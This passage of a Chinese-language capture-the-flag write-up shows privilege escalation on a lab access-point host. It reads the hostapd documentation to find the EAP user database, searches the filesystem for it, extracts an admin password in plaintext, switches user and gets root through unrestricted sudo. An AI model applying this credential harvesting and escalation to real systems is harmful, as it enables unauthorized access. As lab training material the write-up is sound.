   -e   entropy file
   -g   global control interface path
   -G   group for control interfaces
   -P   PID file
   -K   include key data in debug messages
   -f   log output to debug file instead of stdout
   -T   record to Linux tracing in addition to logging
        (records all messages regardless of debug verbosity)
   -i   list of interface names to use
   -S   start all the interfaces synchronously
   -t   include timestamps in some debug messages
   -v   show hostapd version
```

可以看到本质上运行的是 `hostapd`。

并且知道其作用是：

```text
User space daemon for IEEE 802.11 AP management
译：用于 IEEE 802.11 AP 管理的用户空间守护进程
```

在官方主页（`https://w1.fi/hostapd/`）能看到更详细的描述，这里截取部分：

```
hostapd 是一个用于接入点和身份验证服务器的用户空间守护进程。它实现了 IEEE 802.11 接入点管理、IEEE 802.1X/WPA/WPA2/WPA3/EAP 身份验证器、RADIUS 客户端、EAP 服务器以及 RADIUS 身份验证服务器。 当前版本支持 Linux（Host AP、madwifi、基于 mac80211 的驱动程序）和 FreeBSD（net80211）。
```

既然是可以验证身份的，那么本地必然有用于验证身份的文件或者说数据库。

而且官网中展示了配置文件的模板：

![[file-20260508173713350.png]]

点进去查看，并过滤 user，可以找到这段信息：

```
# Path for EAP server user database
# If SQLite support is included, this can be set to "sqlite:/path/to/sqlite.db"
# to use SQLite database instead of a text file.
#eap_user_file=/etc/hostapd.eap_user
```

注释信息的翻译大致是：

```
# EAP 服务器用户数据库路径
# 如果包含 SQLite 支持，可以将其设置为 "sqlite:/path/to/sqlite.db"
# 以使用 SQLite 数据库代替文本文件。
```

换言之，如果本地没有数据库，就采用文件的形式存储用户信息（用于验证用户身份），且文件后缀为 `.eap_user`。

先去 `/etc` 目录下（因为官方给的路径是这个）：

```bash
remote@AirTouch-AP-MGT:/etc$ ls | grep .eap_user
```

没有输出，全局查找：

```bash
remote@AirTouch-AP-MGT:/etc$ find / -name "*.eap_user" 2>/dev/null
/etc/hostapd/hostapd_wpe.eap_user
```

其实就在 `etc` 下，只是多套了一层，查看文件：

```bash
remote@AirTouch-AP-MGT:/etc$ cat /etc/hostapd/hostapd_wpe.eap_user | grep admin
"admin"			                MSCHAPV2		"xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

直接看到了 admin 的密码，尝试切换用户：

```bash
remote@AirTouch-AP-MGT:/etc$ su admin -
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@AirTouch-AP-MGT:/etc$ 
```

成功。

依旧是老套路：

```bash
admin@AirTouch-AP-MGT:/etc$ sudo -l
Matching Defaults entries for admin on AirTouch-AP-MGT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

直接切换 root 用户，并读取 root flag：

```bash
admin@AirTouch-AP-MGT:/etc$ sudo -i
root@AirTouch-AP-MGT:~# cat /root/root.txt 
f102d******************
```
